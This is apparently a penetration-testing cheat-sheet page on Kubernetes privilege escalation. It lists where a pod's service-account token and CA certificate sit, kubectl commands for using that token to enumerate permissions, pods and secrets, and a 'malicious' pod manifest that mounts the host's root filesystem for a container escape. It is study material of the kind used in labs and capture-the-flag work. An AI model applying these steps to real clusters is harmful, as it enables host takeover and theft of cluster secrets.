---
title: "Kubernetes"
date: 2024-7-22
tags: ["Kubernetes", "container", "privesc"]
---

---
### Token Location

<div>

```bash
/run/secrets/kubernetes.io/serviceaccount/token
```

</div>

### Certificate Location

<div>

```bash
/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

</div>

### Basic Commands

<div>

```bash
# List all namespaces
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces
```

```bash
# Get user permissions in current namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list
```

```bash
# Get user permissions in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n <NAMESPACE>
```

```bash
# List all pods
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces
```

```bash
# List pods in specific namespace
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods -n <NAMESPACE>
```

```bash
# Get YAML of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get pod <POD_NAME> -o yaml
```

```bash
# Get info of a pod
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe pod <POD_NAME> -n <NAMESPACE>
```

```bash
# List secrets
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get secrets -n <NAMESPACE>
```

```bash
# Get info of a secret
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 describe secret <secret_name> -n <NAMESPACE>
```

</div>

<small>*Ref: [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/)*</small>

<br>

---

### Abuse #1: Mount host's file system

#### 1. Create a Malicious YAML (Template)

<div>

```yml
apiVersion: v1 
kind: Pod
metadata:
  name: alpine
  namespace: <NAMESPACE_NAME>
spec:
  containers:
  - name: test
    image: <IMAGE_NAME>
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

</div>

#### 2. Create a new pod

<div>

```bash
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 apply -f test.yaml
```

</div>

#### 3. Execute

<div>

```bash
kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 exec test --stdin --tty -n <NAMESPACE>
```

```bash
# Check host filesystem
cd /mnt/root/
```

</div>

<br>